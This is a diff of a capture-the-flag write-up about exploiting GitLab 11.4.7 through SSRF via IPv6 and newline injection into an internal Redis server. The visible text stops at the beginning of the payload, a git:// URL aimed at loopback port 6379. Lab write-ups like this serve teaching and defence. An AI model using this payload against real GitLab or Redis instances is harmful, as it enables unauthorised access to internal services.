@@ -33,7 +33,7 @@ Running gitlab instance **Version CE 11.4.7** *get in help section after registe
 
 # Foothold
 
-## gitlab 11.4.7 ssrf
+## gitlab <11.4.8 SSRF via IPv6
 
 Searching for gitlab exploit on exploitDB
 ```bash
@@ -60,9 +60,9 @@ and it worked
 
 ![](screenshots/bypass-local.png)
 
-Now exploiting radis with ssrl.
+## New line injection to Exploit internal redis server
 
-Payload get from [Jobert Abma hacker1 report](https://hackerone.com/reports/299473)
+Got Payload form bug reported by [Jobert Abma hacker1 report](https://hackerone.com/reports/299473)
 ```rb
 git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
  multi
